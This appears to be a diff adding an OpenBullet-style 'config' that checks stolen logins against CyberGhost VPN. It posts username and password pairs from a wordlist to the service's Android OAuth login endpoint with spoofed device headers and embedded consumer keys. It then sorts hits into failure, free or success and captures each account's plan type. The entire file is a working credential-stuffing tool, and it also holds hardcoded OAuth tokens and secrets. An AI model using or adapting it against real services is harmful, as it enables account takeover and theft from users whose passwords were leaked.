@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "CyberGhost",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-09T02:23:07.6254509-05:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.cyberghostvpn.com/cg/oauth/access_token?prodname=Cg6_Android_API_v1&version=7.0.5.134.4329&lng=en&os=android&cid=bd712afd08a6432aa1dd152a72cc454b&region=US&osver=19&flags=0" 
+  CONTENT "{\"x_auth_machineid\":\"bd712afd08a6432aa1dd152a72cc454b\",\"x_auth_machinename\":\"SM-N9005\",\"x_auth_mode\":\"client_auth\",\"x_auth_username\":\"<USER>\",\"x_auth_password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-N9005 Build/NJH47F)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/json; charset=utf-8" 
+  HEADER "Authorization: OAuth oauth_version=\"1.0\",oath_signature_method=\"PLAINTEXT\",oauth_consumer_key=\"2321624eecd93aacdd70203266f01b92887745\",oauth_signature=\"c6c972fbbaf24380994a31242e8b246c1775afe%26\"" 
+  HEADER "Host: api.cyberghostvpn.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Content-Length: 188" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "USER NOT FOUND OR WRONG PASSWORD!" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "MAXIMUM ACTIVATIONS REACHED" 
+  KEYCHAIN Success OR 
+    KEY "{\"oauth_token\":\"" 
+REQUEST GET "https://api.cyberghostvpn.com/cg/users/me?prodname=Cg6_Android_API_v1&version=7.0.5.134.4329&lng=en&os=android&cid=bd712afd08a6432aa1dd152a72cc454b&region=US&osver=19&oauth_signature_method=PLAINTEXT&oauth_version=1.0&oauth_consumer_key=2321624eecd93aacdd70203266f01b92887745&oauth_token=30496947_b698ed6f1b9815428614f48b68f9e73fa2fe8e70&oauth_signature=c6c972fbbaf24380994a31242e8b246c1775afe%25269a6d55d634f56de16e74c1d1a8b4081754d2bb9b&flags=18&tokenSecret=9a6d55d634f56de16e74c1d1a8b4081754d2bb9b&token=30496947_b698ed6f1b9815428614f48b68f9e73fa2fe8e70" 
+  
+  HEADER "Authorization: OAuth oauth_version=\"1.0\",oath_signature_method=\"PLAINTEXT\",oauth_consumer_key=\"2321624eecd93aacdd70203266f01b92887745\",oauth_token=\"30496947_b698ed6f1b9815428614f48b68f9e73fa2fe8e70\",oauth_signature=\"c6c972fbbaf24380994a31242e8b246c1775afe%269a6d55d634f56de16e74c1d1a8b4081754d2bb9b\"" 
+  HEADER "User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-N9005 Build/NJH47F)" 
+  HEADER "Host: api.cyberghostvpn.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+PARSE "<SOURCE>" LR "plan_type\":\"" "\"}," -> CAP "Plan Type" 
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY ",\"plan_type\":\"free" 
